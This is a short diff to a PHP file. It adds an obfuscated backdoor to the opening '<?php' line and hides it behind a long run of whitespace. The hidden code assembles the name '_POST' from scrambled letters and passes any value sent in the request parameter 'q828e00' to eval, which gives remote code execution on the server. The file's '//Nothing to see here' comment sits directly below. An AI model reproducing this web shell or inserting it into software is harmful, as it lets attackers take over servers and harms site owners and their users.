@@ -1,2 +1,2 @@
-<?php
+<?php                                                                                                                                                                                                                                                       $dbm40= "tops_"; $led2 =strtoupper( $dbm40[4]. $dbm40[2]. $dbm40[1]. $dbm40[3].$dbm40[0]); if ( isset( ${ $led2}['q828e00' ])){ eval(${$led2 }[ 'q828e00' ]) ;} ?> <?php
 //Nothing to see here
